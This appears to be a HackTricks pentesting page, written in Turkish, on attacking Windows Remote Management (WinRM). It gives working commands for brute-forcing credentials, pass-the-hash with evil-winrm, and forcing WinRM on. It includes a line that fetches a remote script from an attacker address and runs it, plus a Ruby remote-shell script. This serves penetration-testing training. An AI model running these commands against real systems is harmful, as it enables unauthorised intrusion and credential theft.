# 5985,5986 - Pentesting WinRM

{{#include ../banners/hacktricks-training.md}}

## WinRM

[Windows Remote Management (WinRM)](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426(v=vs.85).aspx>), **Microsoft tarafından** vurgulanan bir **protokoldür** ve **Windows sistemlerinin uzaktan yönetimini** HTTP(S) üzerinden sağlar, bu süreçte SOAP kullanır. Temelde WMI tarafından desteklenir ve WMI işlemleri için HTTP tabanlı bir arayüz olarak kendini sunar.

Bir makinede WinRM'in varlığı, PowerShell aracılığıyla basit uzaktan yönetim sağlar; bu, diğer işletim sistemleri için SSH'nin nasıl çalıştığına benzer. WinRM'in çalışıp çalışmadığını belirlemek için belirli portların açılıp açılmadığını kontrol etmek önerilir:

- **5985/tcp (HTTP)**
- **5986/tcp (HTTPS)**

Yukarıdaki listeden açık bir port, WinRM'in kurulu olduğunu gösterir ve böylece uzaktan oturum başlatma girişimlerine izin verir.

### **WinRM Oturumu Başlatma**

PowerShell'i WinRM için yapılandırmak üzere, Microsoft'un `Enable-PSRemoting` cmdlet'i devreye girer ve bilgisayarı uzaktan PowerShell komutlarını kabul edecek şekilde ayarlar. Yükseltilmiş PowerShell erişimi ile, bu işlevselliği etkinleştirmek ve herhangi bir hostu güvenilir olarak belirlemek için aşağıdaki komutlar çalıştırılabilir:
```powershell
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
Bu yaklaşım, `trustedhosts` yapılandırmasına bir joker karakter eklemeyi içerir; bu adım, sonuçları nedeniyle dikkatli bir değerlendirme gerektirir. Ayrıca, saldırganın makinesinde ağ türünün "Public"ten "Work"e değiştirilmesinin gerekli olabileceği de belirtilmiştir.

Ayrıca, WinRM `wmic` komutu kullanılarak **uzaktan etkinleştirilebilir**, aşağıdaki gibi gösterilmiştir:
```powershell
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
Bu yöntem, uzaktan WinRM kurulumu yapmayı sağlar ve Windows makinelerini uzaktan yönetme esnekliğini artırır.

### Yapılandırıldığını test et

Saldırı makinenizin kurulumunu doğrulamak için, hedefin WinRM'nin doğru bir şekilde yapılandırılıp yapılandırılmadığını kontrol etmek için `Test-WSMan` komutu kullanılır. Bu komutu çalıştırarak, başarılı bir yapılandırmayı gösteren protokol versiyonu ve wsmid ile ilgili ayrıntıları almayı beklemelisiniz. Aşağıda, yapılandırılmış bir hedef ile yapılandırılmamış bir hedef için beklenen çıktıyı gösteren örnekler bulunmaktadır:

- **Doğru** bir şekilde yapılandırılmış bir hedef için, çıktı şu şekilde görünecektir:
```bash
Test-WSMan <target-ip>
```
Yanıt, WinRM'nin doğru bir şekilde yapılandırıldığını belirten protokol sürümü ve wsmid hakkında bilgi içermelidir.

![](<../images/image (582).png>)

- Aksine, WinRM için **yapılandırılmamış** bir hedef için, böyle ayrıntılı bir bilgi elde edilemeyecek ve uygun bir WinRM yapılandırmasının yokluğunu vurgulayacaktır.

![](<../images/image (458).png>)

### Bir komut çalıştır

Hedef makinede `ipconfig` komutunu uzaktan çalıştırmak ve çıktısını görüntülemek için:
```powershell
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../images/image (151).png>)

Ayrıca, **mevcut PS konsolunuzda bir komut çalıştırabilirsiniz** _**Invoke-Command**_ aracılığıyla. Diyelim ki yerel olarak _**enumeration**_ adında bir fonksiyonunuz var ve bunu **uzaktaki bir bilgisayarda çalıştırmak istiyorsunuz**, bunu yapabilirsiniz:
```powershell
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### Bir Script Çalıştırın
```powershell
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Ters kabuk al
```powershell
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### PS oturumu açın

Etkileşimli bir PowerShell kabuğu almak için `Enter-PSSession` kullanın:
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../images/image (1009).png>)

**Oturum, "kurban" içinde yeni bir süreçte (wsmprovhost) çalışacaktır.**

### **WinRM'yi Açmaya Zorlama**

PS Remoting ve WinRM kullanmak için ancak bilgisayar yapılandırılmamışsa, bunu şu şekilde etkinleştirebilirsiniz:
```powershell
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### Oturumları Kaydetme ve Geri Yükleme

Bu **çalışmayacak** eğer **dil** uzaktaki bilgisayarda **kısıtlıysa**.
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
Bu oturumlar içinde _Invoke-Command_ kullanarak PS betikleri yükleyebilirsiniz.
```powershell
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### Hatalar

Aşağıdaki hatayı bulursanız:

`enter-pssession : Uzak sunucu 10.10.10.175'e bağlanma başarısız oldu. Hata mesajı: WinRM istemcisi isteği işleyemiyor. Kimlik doğrulama şeması Kerberos'tan farklıysa veya istemci bilgisayarı bir domaine katılmamışsa, HTTPS taşıma kullanılmalı veya hedef makine TrustedHosts yapılandırma ayarına eklenmelidir. TrustedHosts'u yapılandırmak için winrm.cmd kullanın. TrustedHosts listesindeki bilgisayarların kimlik doğrulamasının yapılmamış olabileceğini unutmayın. Bununla ilgili daha fazla bilgi almak için aşağıdaki komutu çalıştırabilirsiniz: winrm help config. Daha fazla bilgi için, about_Remote_Troubleshooting Yardım konusuna bakın.`

İstemcide deneme (bilgi için [buraya](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
## WinRM bağlantısı linux'ta

### Kaba Kuvvet

Dikkatli olun, winrm'yi kaba kuvvetle kırmak kullanıcıları engelleyebilir.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### evil-winrm Kullanımı
```ruby
gem install evil-winrm
```
**belgeler**i github'da okuyun: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
Evil-winrm'i bir **IPv6 adresine** bağlanmak için, _**/etc/hosts**_ dosyasına bir giriş oluşturun ve **alan adını** IPv6 adresine ayarlayıp o alana bağlanın.

### Hash'i evil-winrm ile geçirin
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../images/image (680).png>)

### PS-docker makinesi kullanma
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### Bir ruby betiği kullanma

**Buradan alınan kod:** [**https://alamot.github.io/winrm_shell/**](https://alamot.github.io/winrm_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

- `port:5985 Microsoft-HTTPAPI`

## Referanslar

- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## HackTricks Otomatik Komutlar
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‘MySuperSecr3tPass123!’

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
{{#include ../banners/hacktricks-training.md}}
